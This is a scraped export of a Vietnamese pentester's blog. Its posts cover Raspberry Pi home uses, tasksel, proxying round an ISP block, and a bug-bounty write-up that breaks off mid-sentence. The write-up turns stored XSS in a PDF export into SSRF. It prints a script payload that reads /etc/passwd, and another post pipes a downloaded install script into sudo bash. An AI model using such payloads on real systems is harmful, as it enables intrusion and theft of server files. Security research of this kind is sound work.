h·ªÅ c√≥ c·∫£m gi√°c gi·∫≠t lag g√¨ lu√¥n. Vi·ªác s·ª≠ d·ª•ng Dynamic DNS c≈©ng gi√∫p m√¨nh d·ªÖ d√†ng SSH v·ªÅ em Pi 4 kh√° ti·ªán, g√µ terminal m∆∞·ª£t nh∆∞ c√°ch m√† c√°c b·∫°n g√µ tr√™n m√°y ƒëang ng·ªìi v·∫≠y, k b·ªã delay.\nWake on LAN S·∫Ω nh∆∞ th·∫ø n√†o n·∫øu b·∫°n ƒëang ƒëi ch∆°i xa, ƒëi l√†m tr√™n c√¥ng ty m√† mu·ªën l·∫•y t√†i li·ªáu ·ªü c√°i m√°y t√≠nh case ƒë·∫∑t t·∫°i nh√† ü§î. Ho·∫∑c do m√°y t√≠nh tr√™n c√¥ng ty c·∫•u h√¨nh h∆°i y·∫øu, b·∫°n c√≥ build m·ªôt b√© case ·ªü nh√† c·∫•u h√¨nh kh·ªßng long, mu·ªën t·∫≠n d·ª•ng c·∫•u h√¨nh ƒë√≥ ƒë·ªÉ l√†m vi·ªác t·ª´ xa. C√≥ th·ªÉ c√°c b·∫°n nghƒ© ƒë·∫øn vi·ªác bu·ªïi s√°ng m·ªü m√°y t√≠nh ·ªü nh√† l√™n, t·∫Øt m√†n h√¨nh ƒëi cho ƒë·ª° t·ªën ƒëi·ªán + m·ªü teamviewr hay ƒë·∫°i lo·∫°i ch∆∞∆°ng tr√¨nh n√†o cho ph√©p remote desktop. Tuy nhi√™n vi·ªác n√†y c√≥ th·ªÉ g√¢y l√£ng ph√≠ do kh√¥ng ph·∫£i l√∫c n√†o b·∫°n c≈©ng c·∫ßn d√πng c√°i case ·ªü nh√†, vi·ªác m·ªü m√°y li√™n t·ª•c nh∆∞ th·∫ø v·ª´a t·ªën ƒëi·ªán v·ª´a ch·∫≥ng ƒë∆∞·ª£c g√¨ nhi·ªÅu. C√≥ m·ªôt gi·∫£i ph√°p l√† s·ª≠ d·ª•ng Wake On LAN ƒë·ªÉ ƒë√°nh th·ª©c m√°y t√≠nh c·ªßa b·∫°n m·ªói khi c·∫ßn n√≥ kh·ªüi ƒë·ªông l√™n. C√°ch n√†y v·ª´a hi·ªáu qu·∫£ l·∫°i ƒë·ª° ph·∫ßn chi ph√≠ d∆∞ th·ª´a kia.\nNh∆∞ng c√≥ m·ªôt ƒëi·ªÅu c·∫ßn l∆∞u √Ω, mu·ªën g·ª≠i ƒë∆∞·ª£c g√≥i tin Magic Packet ƒë·ªÉ ƒë√°nh th·ª©c chi·∫øc PC y√™u d·∫•u c·ªßa b·∫°n d·∫≠y th√¨ b·∫°n c·∫ßn ph·∫£i trong m·∫°ng LAN ho·∫∑c b·∫°n c·∫ßn ph·∫£i m·ªü port tr√™n router ƒë·∫øn chi·∫øc PC c·ªßa b·∫°n, vi·ªác public port tr·ª±c ti·∫øp ƒë·∫øn PC c√≥ th·ªÉ s·∫Ω c√≥ nguy hi·ªÉm v·ªÅ security, l·ª° ƒë√¢u ai ƒë√≥ ho·∫∑c nhi·ªÅu ai ƒë√≥ brute force g·ª≠i Magic Packet r·ªìi v√¥ t√¨nh m·ªü m√°y t√≠nh b·∫°n l√™n th√¨ sao ü§î. Tuy nhi√™n, t·∫°i sao b·∫°n kh√¥ng s·ª≠ d·ª•ng thi·∫øt b·ªã trong m·∫°ng LAN c·ªßa m√¨nh ƒë·ªÉ ƒë√°nh th·ª©c chi·∫øc PC c·ªßa m√¨nh l√™n ;). ƒê√≥ ch√≠nh l√† chi·∫øc RaspberryPi ƒëang c√†i WireGuard, m√¨nh k·∫øt n·ªëi t·ªõi WireGuard server v√† d√πng ƒë·ªÉ m·ªü m√°y t√≠nh t·ª´ xa, s·ª≠ d·ª•ng RDP ƒë·ªÉ remote desktop l√™n chi·∫øc PC ƒë√≥. C√°c n√†y v·ª´a hi·ªáu qu·∫£, v·ª´a nhanh, v·ª´a an to√†n.\nC√°c b·∫°n c√≥ th·ªÉm xem th√™m video ·ªü ƒë√¢y ƒë·ªÉ th·∫•y ƒë∆∞·ª£c kh·∫£ nƒÉng c·ªßa Wake on LAN nh√© {@embed: https://www.youtube.com/watch?v=hHGPp0K29kw}\nC√°c th·ª© linh tinh kh√°c n·ªØa  M√¨nh c√≥ th·ªÉ truy c·∫≠p ƒë·∫øn router c·ªßa nh√† m√¨nh t·ª´ xa, s·ª≠ d·ª•ng ƒë·ªÉ ƒë·ªïi m·∫≠t kh·∫©u wifi, hay kh·∫Øc ph·ª•c s·ª± c·ªë g√¨ t·ª´ xa ch·ªâ v·ªõi em RaspberryPi nh·ªè b√© S·ª≠ d·ª•ng RaspberryPi ƒë·ªÉ ch·∫°y tools (m√¨nh l√† 1 researcher/pentester, vi·ªác fuzzing hay switch m·∫°ng qua l·∫°i kh√° quan tr·ªçng, vi·ªác thu√™ server kh√° t·ªën k√©m m√† CPU th∆∞·ªùng y·∫øu ƒë·ªëi v·ªõi nh·ªØng g√≥i th·∫•p, v·∫≠y sao kh√¥ng d√πng RaspberryPi v·ª´a nhanh v·ª´a h∆°i m·∫°nh ƒë·ªÉ l√†m nh·ªØng vi·ªác kia nh·ªâ, ƒë·ª° m·ªôt kho·∫£n chi ph√≠ kh√° l·ªõn ƒë·∫•y ;)) D√πng l√†m ƒë√®n ng·ªß. V√¢ng c√°c b·∫°n kh√¥ng nghe nh·∫ßm ƒë√¢u, m√¨nh d√πng ch√≠nh c√°i b√≥ng ƒë√®n ·ªü c√°i fan t·∫£n nhi·ªát c·ªßa RaspberryPi c·ªßa m√¨nh ƒë·ªÉ l√†m ƒë√®n ng·ªß, ƒë√®n th√¨ m√¨nh c√≥ th·ªÉ control ƒë∆∞·ª£c n√≥ m√†u g√¨ n√™n config cho n√≥ c√°i m√†u v√†ng d·ªãu, √°nh s√°ng v·ª´a ph·∫£i l√†m ƒë√®n ng·ªß kh√° ti·ªán :v  Tr√™n ƒë√¢y l√† m·ªôt v√†i th·ª© m√¨nh ƒëang s·ª≠ d·ª•ng v·ªõi Raspberry Pi, v·ªõi c√°c b·∫°n th√¨ sao, c√°c b·∫°n d√πng chi·∫øc m√°y t√≠nh b·ªè t√∫i n√†y l√†m vi·ªác g√¨ c√≥ th·ªÉ chia s·∫ª d∆∞·ªõi comment nh√© ;)\n","permalink":"https://minhtuanact.ml/posts/mot-vai-thu-minh-dang-chay-tren-raspberrypi-tai-nha-cua-minh/","summary":"T·ª± s·ª± H·ªìi ƒë·∫ßu nƒÉm 2020, m√¨nh m·ªõi c√≥ order Taobao v·ªÅ ƒë∆∞·ª£c m·ªôt em RaspberryPi 4 ƒë·ªÉ ph·ª•c v·ª• c√¥ng vi·ªác c·ªßa m√¨nh (th·ª±c ra h·ªìi ƒë√≥ mua ch∆°i th√¥i, mang v·ªÅ ngh·ªãch cho vui). Em Pi 4 n√†y kh√° m·∫°nh, l√†m ƒë∆∞·ª£c ƒë·ªß th·ª© tr√≤, Ram 4GB DDR4, s·ª≠ d·ª•ng ngu·ªìn 15W, ch·∫°y ki·∫øn tr√∫c ARM 64-bit (Raspberry Pi OS b·∫£n ch√≠nh th·ª©c v·∫´n ƒëang ch·∫°y 32-bit, n·∫øu b·∫°n mu·ªën s·ª≠ d·ª•ng h·∫øt s·ª©c m·∫°nh c·ªßa con Pi 4 t·ª´ 4GB tr·ªü l√™n th√¨ ph·∫£i c√†i OS n√†o h·ªó tr·ª£ 64-bit nh√©).","title":"M·ªôt v√†i th·ª© m√¨nh ƒëang ch·∫°y tr√™n RaspberryPi t·∫°i nh√† c·ªßa m√¨nh"},{"content":"Gi·ªõi thi·ªáu L√Ω do b√†i n√†y ra ƒë·ªùi c≈©ng ch·ªâ v√¨ 1 ng∆∞·ªùi b·∫°n c·ªßa m√¨nh k√™u b·ªã l·ªói m·∫•t desktop, ch·ªâ c√≤n g√µ ƒë∆∞·ª£c m·ªói terminal :(. Th√¥i th√¨ √¢u c≈©ng l√† c√°i s·ªë, anh em nh·∫£y v√†o c·ª©u n√©t th√¥i =))\nTasksel C√†i ƒë·∫∑t Tr∆∞·ªõc h·∫øt, ƒë·ªëi m·∫∑t v·ªõi c√°i m√†n h√¨nh Ubuntu m√† c√≥ m·ªói terminal m√† kh√¥ng c√≥ giao di·ªán, c√°c b·∫°n ƒë·ª´ng ho·∫£ng m√† g√µ theo nh·ªØng command sau\n1 2  sudo apt-get update sudo apt-get install tasksel   Sau khi install xong th√¨ kh·ªüi ƒë·ªông tasksel v·ªõi quy·ªÅn sudo th√¥i ;)\n1  sudo tasksel   ·ªû ƒë√¢y c√≥ r·∫•t nhi·ªÅu software cho ch√∫ng ta ch·ªçn, hi·ªán t·∫°i m√°y m√¨nh ƒëang s·ª≠ d·ª•ng Kbuntu Desktop (sau m·ªôt th·ªùi gian d√πng Ubuntu Desktop th·∫•y Gnome h∆°i n·∫∑ng n√™n m√¨nh ƒë·ªïi gi√≥ sang Kubuntu Desktop, c·∫£m th·∫•y c≈©ng kh√° l√† okie).\n·ªû ƒë√¢y m√°y b·∫°n m√¨nh ƒëang kh√¥ng c√≥ giao di·ªán n√™n m√¨nh c·∫ßn c√†i 1 chi·∫øc desktop ƒë·ªÉ l·∫•y l·∫°i giao di·ªán cho b·∫°n ·∫•y, do b·∫°n ·∫•y s·ª≠ d·ª•ng Ubuntu Desktop n√™n m√¨nh ch·ªçn Ubuntu Desktop r·ªìi ch·ªçn Ok\n L∆∞u √Ω: ·ªû ƒë√¢y c√≥ kh√° nhi·ªÅu software cho ch√∫ng ta l·ª±a ch·ªçn, t·ª´ audio, graphic cho ƒë·∫øn Samba, Print ƒë·∫ßy ƒë·ªß c·∫£, n·∫øu c·∫£m th·∫•y c·∫ßn ph·∫ßn n√†o th√¨ c√°c b·∫°n c≈©ng c√≥ th·ªÉ ch·ªçn nh√©.\n Ch·ªçn Ok xong tasksel s·∫Ω t·ª± t·∫£i v√† c√†i ƒë·∫∑t nh·ªØng g√≥i c·∫ßn thi·∫øt, vi·ªác c·∫ßn l√†m b√¢y gi·ªù l√† ng·ªìi ch·ªù v√† kh·ªüi ƒë·ªông l·∫°i m√°y ch√∫ng ta s·∫Ω l·∫•y l·∫°i ƒë∆∞·ª£c giao di·ªán desktop nh∆∞ b√¨nh th∆∞·ªùng th√¥i.\nM·ªôt s·ªë c√°ch c√†i ƒë·∫∑t kh√°c S·ª≠ d·ª•ng ƒë·ªëi s·ªë B·∫°n c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng c√°c ƒë·ªëi s·ªë ƒë·ªÉ c√†i ƒë·∫∑t nh·ªØng package m√† m√¨nh mong mu·ªën\n1  sudo tasksel install lamp-server   C√≥ install th√¨ ph·∫£i c√≥ uninstall r·ªìi, ch√∫ng ta s·ª≠ d·ª•ng c√¢u l·ªánh remove\n1  sudo tasksel remove lamp-server   Ki·ªÉm tra nh·ªØng t√°c v·ª• c√≥ s·∫µn, c√≥ th·ªÉ install (-i) ho·∫∑c uninstall (-u)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  sudo tasksel --list-task u kubuntu-live Kubuntu live CD u lubuntu-live Lubuntu live CD u ubuntu-budgie-live Ubuntu Budgie live CD u ubuntu-live Ubuntu live CD u ubuntu-mate-live Ubuntu MATE Live CD u ubuntustudio-dvd-live Ubuntu Studio live DVD u xubuntu-live Xubuntu live CD u cloud-image Ubuntu Cloud Image (instance) u dns-server DNS server i kubuntu-desktop Kubuntu desktop u lamp-server LAMP server u lubuntu-desktop Lubuntu Desktop i mail-server Mail server u postgresql-server PostgreSQL database   B·∫°n c√≥ th·ªÉ t√¨m th·∫•y m√¥ t·∫£ ƒë·∫ßy ƒë·ªß v·ªÅ t·∫•t c·∫£ c√°c t√°c v·ª• v√† trong c√°c file.\n1 2  /usr/share/tasksel/*.desc /usr/local/share/tasksel/*.desc   Kh√°c Ngo√†i c√°ch s·ª≠ d·ª•ng tasksel, ch√∫ng ta c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng v√†i c√¢u l·ªánh kh√°c ƒë·ªÉ install l·∫°i desktop cho Linux, v√≠ d·ª• nh∆∞\n1 2 3  sudo apt-get install ubuntu-desktop^ sudo apt-get install kubuntu-desktop^ sudo apt-get install lamp-server^   K·∫øt Tasksel l√† m·ªôt c√¥ng c·ª• hi·ªáu qu·∫£ cho b·∫°n n√†o mu·ªën ƒë·ªïi gi√≥ sang 1 giao di·ªán ho√†n to√†n kh√°c m·ªôt c√°ch an to√†n v√† d·ªÖ d√†ng. Vi·ªác c√†i ƒë·∫∑t c≈©ng c·ª±c k·ª≥ ƒë∆°n gi·∫£n cho nh·ªØng b·∫°n n√†o k c√≥ th·ªùi gian v·ªçc v·∫°ch. Nh∆∞ m√¨nh chuy·ªÉn t·ª´ Ubuntu sang Kubuntu ƒë·ªÉ ƒë∆∞·ª£c tr·∫£i nghi·ªám Plasma kh√° l√† nhanh ch√≥ng m√† kh√¥ng s·ª£ b·ªã bug n√†y bug n·ªç, qu√° tr√¨nh chuy·ªÉn ƒë·ªïi c≈©ng m·∫•t h∆°n n·ª≠a ti·∫øng nh∆∞ng m√† m√¨nh ho√†n to√†n h√†i l√≤ng v·ªÅ c√°i n√†y. N·∫øu b·∫°n n√†o ch√°n GNOME kh√° n·∫∑ng n·ªÅ th√¨ c√≥ th·ªÉ chuy·ªÉn sang Plasma gi·ªëng m√¨nh ƒë·ªÉ ƒë∆∞·ª£c tr·∫£i nghi·ªám m·ªõi m·∫ª h∆°n nh√© :D.\n","permalink":"https://minhtuanact.ml/posts/lam-moi-desktop-linux-cua-ban-voi-tasksel/","summary":"Gi·ªõi thi·ªáu L√Ω do b√†i n√†y ra ƒë·ªùi c≈©ng ch·ªâ v√¨ 1 ng∆∞·ªùi b·∫°n c·ªßa m√¨nh k√™u b·ªã l·ªói m·∫•t desktop, ch·ªâ c√≤n g√µ ƒë∆∞·ª£c m·ªói terminal :(. Th√¥i th√¨ √¢u c≈©ng l√† c√°i s·ªë, anh em nh·∫£y v√†o c·ª©u n√©t th√¥i =))\nTasksel C√†i ƒë·∫∑t Tr∆∞·ªõc h·∫øt, ƒë·ªëi m·∫∑t v·ªõi c√°i m√†n h√¨nh Ubuntu m√† c√≥ m·ªói terminal m√† kh√¥ng c√≥ giao di·ªán, c√°c b·∫°n ƒë·ª´ng ho·∫£ng m√† g√µ theo nh·ªØng command sau","title":"L√†m m·ªõi desktop linux c·ªßa b·∫°n v·ªõi tasksel"},{"content":"Intro D·∫°o g·∫ßn ƒë√¢y nh√† m·∫°ng VN c·ª© ch·∫∑n medium l√†m m√¨nh kh√¥ng load ƒë∆∞·ª£c, l√†m m·ªçi c√°ch r·ªìi nh∆∞ng m√† v·∫´n kh√¥ng truy c·∫≠p ƒë∆∞·ª£c medium ngo√†i b·∫≠t VPN sang n∆∞·ªõc kh√°c :sleepy:, tuy nhi√™n m√¨nh l·∫°i c√≥ con VPS b√™n Ch√¢u √Çu n√™n th√†nh ra ch·∫°y kh√° ch·∫≠m. Ban ƒë·∫ßu m√¨nh ƒë·ªãnh config allow c√°c IP c·ªßa medium m·ªõi ch·∫°y qua VPN, tuy nhi√™n Medium l·∫Øm IP n√™n vi·ªác n√†y kh·∫£ thi nh∆∞ng m·∫•t th·ªùi gian =)).\nTuy nhi√™n c√≥ m·ªôt c√°ch kh√°c m√† b·∫°n ch·ªâ v√†i click l√† xong th√¥i, b√†i vi·∫øt n√†y m√¨nh s·∫Ω ch·ªâ c√°c b·∫°n c√°ch config m√† b·∫°n mu·ªën trang n√†y th√¨ ch·∫°y qua VPS, trang n√†y d√πng card m·∫°ng b√¨nh th∆∞·ªùng cho n√≥ nhanh :v:\nNh∆∞·ª£c ƒëi·ªÉm c·ªßa n√≥ l√† m·ªõi ch·ªâ ch·∫°y ƒë∆∞·ª£c tr√™n Linux, Windows v·ªõi Mac ch∆∞a config ƒë∆∞·ª£c, n√™n anh em d√πng Win v·ªõi Mac ch·ªãu kh√≥ ƒë·ªçc th√¥i nh√© :(\n P/S: D·∫°o n√†y ch·∫£ hi·ªÉu sao vƒÉn phong ch√°n qu√°, b·∫°n ƒë·ªçc ƒë·ªçc ch·ªó n√†o ng∆∞·ª£ng ng∆∞·ª£ng b·∫£o m√¨nh s·ª≠a l·∫°i nh√©, ch√¢n th√†nh xin l·ªói c√°c b·∫°n r·∫•t nhi·ªÅu :(\n Wireguard C√°ch 1 Ph√≠a Server ƒê·∫ßu ti√™n, tr√™n VPS c√°c b·∫°n c√†i Wireguard l√™n nh√©, n·∫øu mu·ªën c√†i nhanh th√¨ s·ª≠ d·ª•ng script sau, ch·∫°y ph√°t ƒÉn lu√¥n ;)\n1  wget https://raw.githubusercontent.com/angristan/wireguard-install/master/wireguard-install.sh | sudo bash wireguard-install.sh   Ch·∫°y l√™n n√≥ s·∫Ω h·ªèi 1 s·ªë c√¢u h·ªèi c∆° b·∫£n, c·ª© ·∫•n enter l√† ƒë∆∞·ª£c, n·∫øu mu·ªën config kh√°c th√¨ thay ƒë·ªïi s·ªë li·ªáu t∆∞∆°ng t·ª± th√¥i nh√© ;).\nSau khi c√†i ƒë·∫∑t xong, n√≥ s·∫Ω cung c·∫•p cho b·∫°n 1 file wireguard client, c·ª© ƒë·ªÉ file ƒë·∫•y ·ªü ƒë√≥ ƒë√£, v·ªÅ client c√†i ƒë·∫∑t ti·∫øp\nAi con nh√† ngh√®o k c√≥ VPS d√πng ri√™ng th√¨ c√≥ th·ªÉ s·ª≠ d·ª•ng c√°ch sau nh√©\n Truy c·∫≠p https://warp.apkcombo.com/warpplus.conf L·∫•y n·ªôi dung file n√†y l∆∞u l·∫°i xong l√†m ti·∫øp b√™n d∆∞·ªõi nh√©, ƒë√¢y l√† server VPN mi·ªÖn ph√≠ m√¨nh l·∫•y tr√™n https://apkcombo.com/vi-vn/vpn/, nh∆∞ng m√¨nh ƒëo√°n nhi·ªÅu ng∆∞·ªùi d√πng ch·∫Øc l√† lag l·∫Øm, nh∆∞ng m√† ƒë·ªÉ ƒë·ªçc m·ªói Medium ch·∫Øc tho·∫£i m√°i th√¥i :v  Ph√≠a Client M√¥ h√¨nh c√†i ƒë·∫∑t n√≥ s·∫Ω nh∆∞ th·∫ø n√†y, m√¨nh v·∫Ω h∆°i sida, mong c√°c b·∫°n th√¥ng c·∫£m :(\n L·∫•y n·ªôi dung file wireguard client m√† server generate ra r·ªìi l∆∞u v√†o file  1  /etc/wireguard/wg0.conf    C√†i ƒë·∫∑t docker tr√™n Linux Ch·∫°y command n√†y ƒë·ªÉ c√†i ƒë·∫∑t wireguard ph√≠a client. L√Ω gi·∫£i m·ªôt ch√∫t, ch·∫°y l·ªánh docker n√†y l√™n s·∫Ω t·∫°o 1 container s·ª≠ d·ª•ng file wireguard client m√¨nh v·ª´a l∆∞u v·ª´a n√£y connect ƒë·∫øn server, sau ƒë√≥ m·ªü port 1080 ƒë·ªÉ k·∫øt n·ªëi SOCK5 ra ngo√†i m√°y th·∫≠t c·ªßa m√¨nh.  1 2 3 4 5  docker run -d --restart=always --cap-add=NET_ADMIN \\  --name wireguard-socks-proxy \\  --volume /etc/wireguard/:/etc/wireguard/:ro \\  -p 1080:1080 \\  kizzx2/wireguard-socks-proxy   C√≥ th·ªÉ xem source code t·∫°i https://github.com/kizzx2/docker-wireguard-socks-proxy\nƒê·∫øn b√¢y gi·ªù ta c√≥ m·ªôt connect l√™n VPS t·ª´ client th√¥ng qua SOCKS5 port 1080. V·∫≠y b√¢y gi·ªù ch·ªâ c·∫ßn ƒëi·ªÅu ch·ªânh l√†m sao cho khi truy c·∫≠p v√†o medium th√¨ s·∫Ω g·ª≠i request th√¥ng qua SOCKS5 port 1080 ƒë·ªÉ server x·ª≠ l√Ω r·ªìi g·ª≠i response v·ªÅ tr√¨nh duy·ªát hi·ªÉn th·ªã l√™n l√† xong :D. V√¨ m·∫∑c ƒë·ªãnh request m√°y client g·ª≠i qua card m·∫°ng b√¨nh th∆∞·ªùng c·ªßa m√¨nh th√¥i.\nV·∫≠y l√†m th·∫ø n√†o ƒë·ªÉ ƒëi·ªÅu ch·ªânh c√°c trang web m√¨nh mu·ªën truy c·∫≠p th√¥ng qua VPS, c√≥ m·ªôt extension c√≥ c·∫£ tr√™n Chromium v√† Firefox t√™n Proxy SwitchyOmega\nChrome: https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=vi\nFirefox: https://addons.mozilla.org/vi/firefox/addon/switchyomega/\n·ªû ƒë√¢y m√¨nh s·∫Ω demo qua Chrome nh√©, Firefox l√†m t∆∞∆°ng t·ª±.\n T·∫°o 1 profile t√™n WireGuard, m√¨nh ƒë·ªÉ th·∫ø c√≤n c√°c b·∫°n ƒë·ªÉ t√™n th·∫ø n√†o c≈©ng ƒë∆∞·ª£c ;), config nh∆∞ h√¨nh d∆∞·ªõi, v·ªõi Protocol l√† SOCKS5.  Nh·ªõ ·∫•n Apply changes ƒë·ªÉ confirmd thay ƒë·ªïi nh√©.\n Truy c·∫≠p v√†o Medium, ch·ªçn extension Switchy Omega, ch·ªçn Add condition   Chuy·ªÉn sang profile WireGuard r·ªìi Add condition  L√∫c n√†y trang ƒë√£ load l·∫°i, nh·ªõ ch·ªçn auto switch ƒë·ªÉ n√≥ t·ª± ƒë·ªông chuy·ªÉn qua l·∫°i gi·ªØa c√°c profile nh√© :D\nC√°i icon extension Switchy Omega chuy·ªÉn sang m√†u xanh th·∫ø kia l√† ƒëang load medium v·ªõi k·∫øt n·ªëi wireguard l√™n VPS r·ªìi nh√©, c√°ch n√†y c√≥ th·ªÉ l√†m t∆∞∆°ng t·ª± ƒë·ªëi v·ªõi nh·ªØng website b·ªã ch·∫∑n kh√°c. Ch√∫c anh em th√†nh c√¥ng ;)\nC√°ch 2 C√°ch n√†y kh√¥ng y√™u c·∫ßu c√°c b·∫°n c√≥ 1 con VPS n√†o c·∫£, s·ª≠ d·ª•ng lu√¥n h√†ng c·ªßa Cloudflare cho n√≥ mi·ªÖn ph√≠\nTh·ª±c hi·ªán c√†i ƒë·∫∑t Cloudflare Warp tr√™n https://1.1.1.1/ (tu·ª≥ v√†o H·ªá ƒëi·ªÅu h√†nh c·ªßa b·∫°n l√† g√¨ th√¨ c√†i t∆∞∆°ng t·ª±)\nTruy c·∫≠p v√†o Preferences ƒë·ªÉ c√†i ƒë·∫∑t Proxy Socks5 cho Cloudflare Warp (th·ª±c ch·∫•t ƒë·∫±ng sau th·∫±ng Warp n√†y c≈©ng s·ª≠ d·ª•ng Wireguard n√™n n√≥ m·ªõi nhanh th·∫ø :joy:)\nEnable proxy mode, port th√¨ c√°c b·∫°n th√≠ch ƒë·ªÉ port n√†o c≈©ng ƒë∆∞·ª£c, m·∫∑c ƒë·ªãnh Socks5 proxy s·∫Ω l√† 1080\nChuy·ªÉn sang t√≠nh nƒÉng Warp via Local Proxy, r·ªìi enable Warp l√™n l√† xong\nTr√¨nh duy·ªát c√°c b·∫°n s·ª≠ d·ª•ng Proxy SwitchyOmega v√† l√†m t∆∞∆°ng t·ª± nh∆∞ h∆∞·ªõng d·∫´n b√™n tr√™n th√¥i.\n","permalink":"https://minhtuanact.ml/posts/doc-medium-khi-bi-nha-mang-chan/","summary":"Intro D·∫°o g·∫ßn ƒë√¢y nh√† m·∫°ng VN c·ª© ch·∫∑n medium l√†m m√¨nh kh√¥ng load ƒë∆∞·ª£c, l√†m m·ªçi c√°ch r·ªìi nh∆∞ng m√† v·∫´n kh√¥ng truy c·∫≠p ƒë∆∞·ª£c medium ngo√†i b·∫≠t VPN sang n∆∞·ªõc kh√°c :sleepy:, tuy nhi√™n m√¨nh l·∫°i c√≥ con VPS b√™n Ch√¢u √Çu n√™n th√†nh ra ch·∫°y kh√° ch·∫≠m. Ban ƒë·∫ßu m√¨nh ƒë·ªãnh config allow c√°c IP c·ªßa medium m·ªõi ch·∫°y qua VPN, tuy nhi√™n Medium l·∫Øm IP n√™n vi·ªác n√†y kh·∫£ thi nh∆∞ng m·∫•t th·ªùi gian =)).","title":"ƒê·ªçc Medium khi b·ªã nh√† m·∫°ng ch·∫∑n"},{"content":"Gi·ªõi thi·ªáu D·∫°o g·∫ßn ƒë√¢y m√¨nh t√¨nh c·ªù g·∫∑p r·∫•t nhi·ªÅu l·ªói XSS, tuy nhi√™n trang ƒë√≥ l·∫°i c√≥ s·ª≠ d·ª•ng d·ªØ li·ªáu ng∆∞·ªùi d√πng input v√†o ƒë·ªÉ export ra PDF. V·∫≠y l√†m sao ƒë·ªÉ c√≥ th·ªÉ n√¢ng impact l√™n m·ª©c cao h∆°n, m√¨nh c≈©ng ƒë√£ g·∫∑p nhi·ªÅu case d·ªÖ d√†ng c√≥, kh√≥ khƒÉn c≈©ng c√≥, hi v·ªçng b√†i bi·∫øt n√†y c·ªßa m√¨nh s·∫Ω gi√∫p b·∫°n ƒë·ªçc hi·ªÉu r√µ v·∫•n ƒë·ªÅ khi code ho·∫∑c pentest 1 t√≠nh nƒÉng export PDF.\n B√†i vi·∫øt n√†y ƒë∆∞·ª£c vi·∫øt v√†o m·ªôt bu·ªïi s√°ng tr·ªùi kh√° ƒë·∫πp nh∆∞ng v·ªôi v√†ng, hi v·ªçng c√≥ c√¢u t·ª´ n√†o ch∆∞a ƒë∆∞·ª£c chau chu·ªët mong b·∫°n ƒë·ªçc b·ªè qua, ho·∫∑c c√≥ th·ªÉ comment b√™n d∆∞·ªõi ƒë·ªÉ m√¨nh edit l·∫°i cho t·ª´ ng·ªØ ƒë∆∞·ª£c m∆∞·ª£t m√† h∆°n :D, c·∫£m ∆°n c√°c b·∫°n.\n M·ªü ƒë·∫ßu V√†o m·ªôt bu·ªïi s√°ng h√¥m n√†o m√¨nh c≈©ng kh√¥ng nh·ªõ n·ªØa, m·ªôt ng∆∞·ªùi em c·ªßa m√¨nh c√≥ b·∫£o m√¨nh l√† m·ªõi ph√°t hi·ªán ra Stored XSS tr√™n m·ªôt trang web c≈©ng kh√° nhi·ªÅu ng∆∞·ªùi d√πng, ƒë√¢u ƒë√≥ kho·∫£ng 1 tri·ªáu th√¨ ph·∫£i - ho·∫∑c nhi·ªÅu h∆°n m√¨nh kh√¥ng ch·∫Øc :D. M√¨nh c≈©ng t√≤ m√≤ th·ª≠ v√†o xem ch·ªó n√†o trigger XSS. Trang n√†y th√¨ c√≥ validate input ƒë·∫ßu v√†o c·ªßa ng∆∞·ªùi d√πng tr√™n client ch·ª© kh√¥ng check l·∫°i ph√≠a server, v·∫≠y ƒë∆°n gi·∫£n r·ªìi. Nh∆∞ng m√† m√¨nh ch·∫≥ng hi·ªÉu code ki·ªÉu g√¨ truy·ªÅn payload xss alert l√™n th√¨ server b√°o v·ªÅ 504, tuy nhi√™n n·ªôi dung v·∫´n ƒë∆∞·ª£c c·∫≠p nh·∫≠t V√† trigger XSS\nV·∫≠y l√† ƒë√£ Stored XSS ƒë∆∞·ª£c r·ªìi, l·ªói n√†y ƒë√°nh cao nh·∫•t ƒë∆∞·ª£c ·ªü m·ª©c high, tuy nhi√™n m√¨nh ƒëang c·∫ßn n√¢ng impact c·ªßa l·ªói n√†y l√™n cao h∆°n l√† Critical. M√¨nh t√¨m th·∫•y c√≥ 1 t√≠nh nƒÉng l√† export file PDF cho ng∆∞·ªùi d√πng t·∫£i v·ªÅ. V·∫≠y th·ª≠ m·ªôt ch√∫t payload kh√°c xem sao 1  \u0026lt;script\u0026gt;document.write(document.location)\u0026lt;/script\u0026gt;   R·ªìi t·∫°o file PDF ta ƒë∆∞·ª£c ƒëi·ªÅu n√†y\n·ªí men, code script ch·∫°y ƒë∆∞·ª£c. V·∫≠y l√† ta c√≥ th·ªÉ inject ƒë∆∞·ª£c script v√†o r·ªìi ƒë·ªÉ server render ra file PDF. ƒê·ªçc l·∫°i b√†i c·ªßa m·ªôt ng∆∞·ªùi anh ng·ªìi c·∫°nh t·∫°i Khai th√°c l·ªó h·ªïng ƒë·ªÉ l·∫•y ƒë∆∞·ª£c source code c·ªßa d·ªãch v·ª• Y c·ªßa platform X , th·ª≠ truy·ªÅn payload ƒë·ªçc /etc/passwd xem c√≥ ƒë·ªçc ƒë∆∞·ª£c kh√¥ng\n1  \u0026lt;script\u0026gt;x = new XMLHttpRequest; x.onload = function () { document.write(this.responseText + document.location.pathname) }; x.open(\u0026#39;GET\u0026#39;, \u0026#39;file:///etc/passwd\u0026#39;); x.send();\u0026lt;/script\u0026gt;   K·∫øt qu·∫£ ƒë√∫ng nh∆∞ trong s√°ch vi·∫øt, nh∆∞ng m√† ·ªü endpoint kh√°c, trang n√†y c√≥ 2 n√∫t t·∫£i PDF v·ªÅ, 1 n√∫t th√¨ render b·∫±ng wkhtmltopdf, c√≤n n√∫t kia s·ª≠ d·ª•ng Skia/PDF m86 d√πng Chromium ƒë·ªÉ render. ·ªû ƒë√¢y m√¨nh s·∫Ω ch·ªâ focus v√†o Skia/PDF m86 nh√©.\nDo trang n√†y s·ª≠ d·ª•ng Skia/PDF m86 d√πng Chromium n√™n m·∫∑c ƒë·ªãnh Chromium s·∫Ω ch·∫∑n JS g·ªçi file local\nV·∫≠y th√¨ gi·ªù ch√∫ng ta s·∫Ω l√†m th·∫ø n√†o b√¢y gi·ªù Nh∆∞ng, √¥ng tr·ªùi kh√¥ng ph·ª• l√≤ng ng∆∞·ªùi, ki·ªÉm tra d·ªãch v·ª• site n√†y ƒëang ch·∫°y th√¨ n√≥ ƒëang s·ª≠ d·ª•ng AWS\nDo PDF ƒë∆∞·ª£c render t·ª´ ph√≠a server, n√™n c√≥ th·ªÉ s·ª≠ d·ª•ng t·∫•n c√¥ng SSRF, nh√∫ng iframe ho·∫∑c vi·∫øt payload JS ƒë·ªÉ th·ª±c hi·ªán call localhost.\nDo AWS 